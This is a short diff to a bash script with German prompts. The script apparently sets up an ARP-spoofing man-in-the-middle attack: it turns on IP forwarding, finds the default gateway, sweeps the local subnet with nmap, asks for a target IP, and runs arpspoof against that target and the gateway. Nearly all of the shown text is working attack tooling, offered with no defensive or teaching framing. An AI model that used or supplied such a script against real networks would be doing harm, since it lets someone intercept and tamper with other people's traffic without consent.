@@ -9,10 +9,13 @@ fi
 
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
+gateway=$(route -n|grep ^0.0.0.0|cut -d' ' -f 10)
+
+ip link
 read -p "Wie heisst die Schnittstelle? [enp30s0\eth0] : " modul
+nmap -sn ${gateway}/24
 read -p "Wie heisst die IP? : " ip
 
-gateway=$(route -n|grep ^0.0.0.0|cut -d' ' -f 10)
 
 arpspoof -i $modul -t $ip -r $gateway &
 
